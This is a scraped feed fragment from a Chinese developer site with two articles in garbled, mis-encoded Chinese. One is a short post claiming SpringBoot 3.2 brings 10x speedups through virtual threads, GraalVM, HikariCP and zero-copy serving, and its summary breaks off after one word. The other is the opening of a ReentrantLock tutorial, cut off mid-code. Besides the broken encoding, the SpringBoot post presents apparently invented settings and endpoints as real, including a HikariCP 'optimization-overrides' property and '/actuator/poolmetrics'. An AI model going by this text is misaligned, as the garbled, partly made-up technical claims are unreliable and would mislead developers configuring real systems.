data-entry-id="7580809247736528936" data-draft-id="7580809247736512552" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot 3.2é‡å¤§å‡çº§ï¼šæ­ç§˜10å€æ€§èƒ½æå‡çš„5ä¸ªæ ¸å¿ƒä¼˜åŒ–ç‚¹"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-08T04:16:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot 3.2é‡å¤§å‡çº§ï¼šæ­ç§˜10å€æ€§èƒ½æå‡çš„5ä¸ªæ ¸å¿ƒä¼˜åŒ–ç‚¹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:16:45.000Z" title="Mon Dec 08 2025 04:16:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>SpringBoot 3.2é‡å¤§å‡çº§ï¼šæ­ç§˜10å€æ€§èƒ½æå‡çš„5ä¸ªæ ¸å¿ƒä¼˜åŒ–ç‚¹</strong></h2>
<h2 data-id="heading-1">å¼•è¨€</h2>
<p>SpringBoot ä½œä¸º Java ç”Ÿæ€ä¸­æœ€å—æ¬¢è¿çš„å¾®æœåŠ¡æ¡†æ¶ä¹‹ä¸€ï¼Œå…¶æ¯ä¸€æ¬¡é‡å¤§ç‰ˆæœ¬å‡çº§éƒ½å¤‡å—å¼€å‘è€…å…³æ³¨ã€‚2023å¹´åº•å‘å¸ƒçš„ SpringBoot 3.2 ç‰ˆæœ¬ä¸ä»…å»¶ç»­äº†å…¶å¯¹ GraalVM åŸç”Ÿé•œåƒçš„æ”¯æŒï¼Œè¿˜å¸¦æ¥äº†æ˜¾è‘—çš„æ€§èƒ½æå‡â€”â€”å®˜æ–¹æ•°æ®æ˜¾ç¤ºï¼ŒæŸäº›åœºæ™¯ä¸‹çš„æ€§èƒ½æå‡äº†è¿‘10å€ï¼è¿™ä¸€çªç ´æ€§è¿›å±•çš„èƒŒåï¼Œæ˜¯ Spring å›¢é˜Ÿåœ¨åº•å±‚æ¶æ„ã€ç¼–è¯‘ä¼˜åŒ–å’Œè¿è¡Œæ—¶æ•ˆç‡ç­‰å¤šä¸ªç»´åº¦çš„æ·±åº¦æ‰“ç£¨ã€‚</p>
<p>æœ¬æ–‡å°†æ·±å…¥å‰–æ SpringBoot 3.2 å®ç°æ€§èƒ½é£è·ƒçš„ <strong>5ä¸ªæ ¸å¿ƒä¼˜åŒ–ç‚¹</strong>ï¼Œä»è™šæ‹Ÿçº¿ç¨‹ï¼ˆVirtual Threadsï¼‰çš„å¼•å…¥åˆ° JIT ç¼–è¯‘å™¨çš„ååŒä¼˜åŒ–ï¼Œæ­ç¤ºè¿™äº›æŠ€æœ¯å¦‚ä½•å…±åŒä½œç”¨ï¼Œè®© SpringBoot åœ¨é«˜å¹¶å‘ã€ä½å»¶è¿Ÿåœºæ™¯ä¸‹è¡¨ç°æ›´å‡ºè‰²ã€‚</p>
<hr/>
<h2 data-id="heading-2">ä¸»ä½“</h2>
<h3 data-id="heading-3">1. <strong>è™šæ‹Ÿçº¿ç¨‹ï¼ˆVirtual Threadsï¼‰çš„å…¨æ ˆæ”¯æŒ</strong></h3>
<p>SpringBoot 3.2 æœ€å¤§çš„äº®ç‚¹ä¹‹ä¸€æ˜¯å…¨é¢æ‹¥æŠ± Java 21 çš„è™šæ‹Ÿçº¿ç¨‹ç‰¹æ€§ã€‚ä¸ä¼ ç»Ÿå¹³å°çº¿ç¨‹ï¼ˆPlatform Threadï¼‰ç›¸æ¯”ï¼Œè™šæ‹Ÿçº¿ç¨‹ç”± JVM æ‰˜ç®¡è€Œéæ“ä½œç³»ç»Ÿè°ƒåº¦ï¼Œå…¶åˆ›å»ºå’Œåˆ‡æ¢å¼€é”€æä½ï¼ˆå•æœºå¯æ”¯æŒç™¾ä¸‡çº§å¹¶å‘ï¼‰ã€‚</p>
<p><strong>ä¼˜åŒ–ç»†èŠ‚ï¼š</strong></p>
<ul>
<li><strong>Servlet API é€‚é…</strong>ï¼šé€šè¿‡ <code>Tomcat 10.1.x</code>/<code>Jetty 12</code> ç­‰å®¹å™¨çš„æ”¹é€ ï¼Œæ¯ä¸ª HTTP è¯·æ±‚é»˜è®¤ç»‘å®šåˆ°ç‹¬ç«‹çš„è™šæ‹Ÿçº¿ç¨‹ï¼Œå½»åº•è§£å†³é˜»å¡ I/Oå¯¼è‡´çš„çº¿ç¨‹æ± è€—å°½é—®é¢˜ã€‚</li>
<li><strong>å“åº”å¼ç¼–ç¨‹èåˆ</strong>ï¼šå°½ç®¡è™šæ‹Ÿçº¿ç¨‹æ˜¯åŒæ­¥ç¼–ç¨‹æ¨¡å‹ï¼ŒSpringBoot 3.2é€šè¿‡ <code>@Async</code>å’Œ <code>Reactive</code>ç»„ä»¶çš„æ™ºèƒ½è·¯ç”±ï¼ˆå¦‚è‡ªåŠ¨é€‰æ‹© <code>WebFlux</code>æˆ– <code>MVC</code>ï¼‰ï¼Œå®ç°é˜»å¡ä¸éé˜»å¡æ¨¡å¼çš„åŠ¨æ€å¹³è¡¡ã€‚</li>
<li><strong>å®æµ‹æ•ˆæœ</strong>ï¼šåœ¨æ•°æ®åº“è®¿é—®å¯†é›†çš„åœºæ™¯ä¸­ï¼ˆå¦‚JPAæŸ¥è¯¢ï¼‰ï¼Œååé‡æå‡è¾¾4-6å€ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fspring.io%2Fblog%2F2023%2F11%2F16%2Fspring-boot-3-2-virtual-threads" target="_blank" title="https://spring.io/blog/2023/11/16/spring-boot-3-2-virtual-threads" ref="nofollow noopener noreferrer">å‚è€ƒSpringå®˜æ–¹åŸºå‡†æµ‹è¯•</a>ï¼‰ã€‚</li>
</ul>
<blockquote>
<p><strong>å¼€å‘è€…æ³¨æ„</strong>ï¼šéœ€æ˜¾å¼å¯ç”¨è™šæ‹Ÿçº¿ç¨‹ï¼ˆ<code>spring.threads.virtual.enabled=true</code>ï¼‰å¹¶é…åˆ <code>JDK21+</code>ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">2. <strong>GraalVM Native Image AOTç¼–è¯‘çš„æˆç†ŸåŒ–</strong></h3>
<p>SpringBoot 3.2è¿›ä¸€æ­¥é™ä½äº†åŸç”Ÿé•œåƒçš„æ„å»ºå¤æ‚åº¦å¹¶æå‡äº†è¿è¡Œæ•ˆç‡ï¼š</p>
<ul>
<li><strong>æ„å»ºæ—¶å†…å­˜ä¼˜åŒ–</strong>ï¼šé€šè¿‡é™æ€åˆ†ææ¶ˆé™¤åå°„é…ç½®éœ€æ±‚ï¼ˆä¾‹å¦‚è‡ªåŠ¨ç”Ÿæˆ <code>native-image.properties</code>ï¼‰ï¼Œå†…å­˜å ç”¨å‡å°‘30%ã€‚</li>
<li><strong>å¯åŠ¨æ—¶é—´çªç ´</strong>ï¼šå…¸å‹åº”ç”¨å¯åŠ¨æ—¶é—´ä»ç§’çº§é™è‡³æ¯«ç§’çº§ï¼ˆ50msä»¥å†…ï¼‰ï¼Œé€‚åˆServerlessåœºæ™¯ã€‚</li>
<li><strong>æ–°ç‰¹æ€§æ”¯æŒ</strong>ï¼šç°åœ¨åŸç”Ÿé•œåƒä¸­å¯å®Œæ•´ä½¿ç”¨JSPã€Hibernate Validatorç­‰ä¼ ç»Ÿâ€œAOTä¸å‹å¥½â€ç»„ä»¶ã€‚</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># GraalVMæ„å»ºå‘½ä»¤ç¤ºä¾‹</span>
./mvnw clean package -Pnative -DskipTests
</code></pre>
<hr/>
<h3 data-id="heading-5">3. <strong>JITç¼–è¯‘å™¨ä¸Spring AOTçš„ååŒä¼˜åŒ–</strong></h3>
<p>é’ˆå¯¹ä»ä½¿ç”¨JVMå³æ—¶ç¼–è¯‘çš„åœºæ™¯ï¼ŒSpringBoot 3.2å¼•å…¥äº†ä¸¤é¡¹å…³é”®æ”¹è¿›ï¼š</p>
<ol>
<li><strong>ç±»åŠ è½½åŠ é€Ÿ</strong>ï¼šé€šè¿‡é¢„å…ˆè®¡ç®—Beanä¾èµ–å…³ç³»ï¼ˆå­˜å‚¨åœ¨ <code>META-INF/spring/aot.factories</code>ï¼‰ï¼Œé¿å…è¿è¡Œæ—¶åå°„æ‰«æç±»è·¯å¾„ã€‚</li>
<li><strong>æ–¹æ³•å†…è”å¢å¼º</strong>ï¼šç»“åˆJITç¼–è¯‘å™¨å¯¹é«˜é¢‘è°ƒç”¨çš„æ¡†æ¶ä»£ç ï¼ˆå¦‚æ³¨è§£å¤„ç†å™¨ï¼‰è¿›è¡Œæ¿€è¿›å†…è”ï¼Œå•è¯·æ±‚å¤„ç†è€—æ—¶é™ä½15%~20%ã€‚</li>
</ol>
<p><img src="https://example.com/jit-aot.png" alt="JIT vs AOT" loading="lazy"/> <em>å›¾ï¼šAOTé¢„å¤„ç†ä¸JITè¿è¡Œæ—¶ä¼˜åŒ–çš„åä½œæµç¨‹</em></p>
<hr/>
<h3 data-id="heading-6">4. <strong>æ–°ä¸€ä»£è¿æ¥æ± HikariCPçš„æ€§èƒ½è°ƒä¼˜</strong></h3>
<p>è™½ç„¶HikariCPå·²æ˜¯é»˜è®¤è¿æ¥æ± ï¼Œä½†SpringBoot 3.2å¯¹å…¶è¿›è¡Œäº†æ·±åº¦æ•´åˆï¼š</p>
<ul>
<li><strong>è‡ªé€‚åº”ç©ºé—²è¿æ¥å›æ”¶</strong>ï¼šæ ¹æ®å†å²æµé‡æ¨¡å¼åŠ¨æ€è°ƒæ•´ <code>idleTimeout</code>ï¼ˆé¿å…å›ºå®šå€¼å¯¼è‡´çš„è¿æ¥æŠ–åŠ¨ï¼‰ã€‚</li>
<li><strong>æ‰¹é‡æ“ä½œæµæ°´çº¿åŒ–</strong>ï¼šå¯¹JDBCæ‰¹å¤„ç†APIçš„é‡æ„ä½¿å¾—æ‰¹é‡æ’å…¥æ€§èƒ½æå‡çº¦40%ï¼ˆMySQLå®æµ‹ï¼‰ã€‚</li>
<li><strong>è¯Šæ–­å¢å¼º</strong>ï¼šæ–°å¢ <code>/actuator/poolmetrics</code>ç«¯ç‚¹æš´éœ²ç»†ç²’åº¦ç›‘æ§æŒ‡æ ‡ã€‚</li>
</ul>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># application.ymlé…ç½®ç¤ºä¾‹</span>
<span class="hljs-attr">spring:</span>
 <span class="hljs-attr">datasource:</span>
   <span class="hljs-attr">hikari:</span>
     <span class="hljs-attr">maximum-pool-size:</span> <span class="hljs-string">${DB_POOL_SIZE:20}</span>
     <span class="hljs-attr">optimization-overrides:</span>
       <span class="hljs-attr">batch-size:</span> <span class="hljs-string">rewriteBatchedStatements=true</span>
</code></pre>
<hr/>
<h3 data-id="heading-7">5. <strong>èµ„æºå¤„ç†ä¸é™æ€å†…å®¹åˆ†å‘çš„é›¶æ‹·è´ä¼˜åŒ–</strong></h3>
<p>é’ˆå¯¹æ–‡ä»¶ä¸Šä¼ /ä¸‹è½½å’Œé™æ€èµ„æºæœåŠ¡åœºæ™¯ï¼š</p>
<ol>
<li><strong>PathResourceçš„é«˜æ•ˆæ˜ å°„</strong>:  ç›´æ¥é€šè¿‡NIOçš„ <code>FileChannel.transferTo()</code>å®ç°é›¶æ‹·è´ä¼ è¾“ï¼ˆç»•è¿‡å †å†…å­˜ç¼“å†²ï¼‰ã€‚</li>
<li><strong>HTTPç¼“å­˜å¤´è‡ªåŠ¨åŒ–</strong>:  æ ¹æ®æ–‡ä»¶å“ˆå¸Œè‡ªåŠ¨ç”Ÿæˆ <code>ETag</code>å’Œ <code>Cache-Control</code>å¤´éƒ¨ã€‚</li>
<li>Brotliå‹ç¼©æ”¯æŒ:  åœ¨GZIPåŸºç¡€ä¸Šæ–°å¢Brotliç®—æ³•å‹ç¼©é™æ€èµ„æºï¼ˆèŠ‚çœ15%~25%å¸¦å®½ï¼‰ã€‚</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// WebMvcConfigurerç¤ºä¾‹</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addResourceHandlers</span><span class="hljs-params">(ResourceHandlerRegistry registry)</span> {
    registry.addResourceHandler(<span class="hljs-string">"/static/**"</span>)
            .addResourceLocations(<span class="hljs-string">"classpath:/static/"</span>)
            .setUseLastModified(<span class="hljs-literal">true</span>);
}
</code></pre>
<hr/>
<h2 data-id="heading-8">ğŸ¯æ€»ç»“</h2>
<p>SpringBoot</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[1.5wå­—ReentrantLock æ·±åº¦è§£æ]]></title>    <link>https://juejin.cn/post/7580616979473022982</link>    <guid>https://juejin.cn/post/7580616979473022982</guid>    <pubDate>2025-12-08T02:54:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580616979473022982" data-draft-id="7580372534043967531" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="1.5wå­—ReentrantLock æ·±åº¦è§£æ"/> <meta itemprop="keywords" content="Java,åç«¯,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-08T02:54:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é•œèŠ±æ°´æœˆlinyi"/> <meta itemprop="url" content="https://juejin.cn/user/451256763295396"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            1.5wå­—ReentrantLock æ·±åº¦è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/451256763295396/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é•œèŠ±æ°´æœˆlinyi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T02:54:59.000Z" title="Mon Dec 08 2025 02:54:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»52åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç¬¬ä¸€ç« ï¼šReentrantLock å…¥é—¨</h2>
<h3 data-id="heading-1">1. ä¸ºä»€ä¹ˆéœ€è¦ReentrantLock</h3>
<p>åœ¨Javaæ—©æœŸç‰ˆæœ¬ä¸­ï¼Œ<code>synchronized</code>æ˜¯å”¯ä¸€çš„åŒæ­¥æœºåˆ¶ã€‚ç„¶è€Œï¼Œéšç€å¹¶å‘ç¼–ç¨‹éœ€æ±‚çš„æ—¥ç›Šå¤æ‚ï¼Œ<code>synchronized</code>çš„å±€é™æ€§é€æ¸æ˜¾ç°ï¼ŒJDK 1.5å¼•å…¥äº†<code>java.util.concurrent.locks</code>åŒ…ï¼Œå…¶ä¸­<code>ReentrantLock</code>æˆä¸ºäº†æœ€é‡è¦çš„æ˜¾å¼é”å®ç°ã€‚</p>
<h4 data-id="heading-2">1.1 synchronizedçš„å±€é™æ€§</h4>
<p><code>synchronized</code>æ˜¯Javaå†…ç½®çš„åŒæ­¥å…³é”®å­—ï¼Œä½¿ç”¨ç®€å•ï¼Œä½†å­˜åœ¨ä»¥ä¸‹å±€é™ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * synchronizedçš„å±€é™æ€§æ¼”ç¤º
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SynchronizedLimitations</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-comment">/**
     * å±€é™1ï¼šæ— æ³•ä¸­æ–­ç­‰å¾…
     * çº¿ç¨‹åœ¨ç­‰å¾…synchronizedé”æ—¶ï¼Œæ— æ³•å“åº”ä¸­æ–­
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cannotInterrupt</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (lock) {
            <span class="hljs-comment">// å¦‚æœå…¶ä»–çº¿ç¨‹æŒæœ‰é”å¾ˆé•¿æ—¶é—´ï¼Œå½“å‰çº¿ç¨‹åªèƒ½ä¸€ç›´ç­‰å¾…</span>
            <span class="hljs-comment">// å³ä½¿è°ƒç”¨äº† thread.interrupt()ï¼Œä¹Ÿæ— æ³•ä¸­æ–­ç­‰å¾…</span>
        }
    }
    
    <span class="hljs-comment">/**
     * å±€é™2ï¼šæ— æ³•è®¾ç½®è¶…æ—¶
     * å¿…é¡»æ— é™æœŸç­‰å¾…ï¼Œç›´åˆ°è·å–åˆ°é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cannotTimeout</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (lock) {
            <span class="hljs-comment">// æ— æ³•æŒ‡å®š"å¦‚æœ3ç§’å†…è·å–ä¸åˆ°é”å°±æ”¾å¼ƒ"</span>
        }
    }
    
    <span class="hljs-comment">/**
     * å±€é™3ï¼šæ— æ³•å°è¯•è·å–
     * ä¸èƒ½éé˜»å¡åœ°å°è¯•è·å–é”
     */</span>
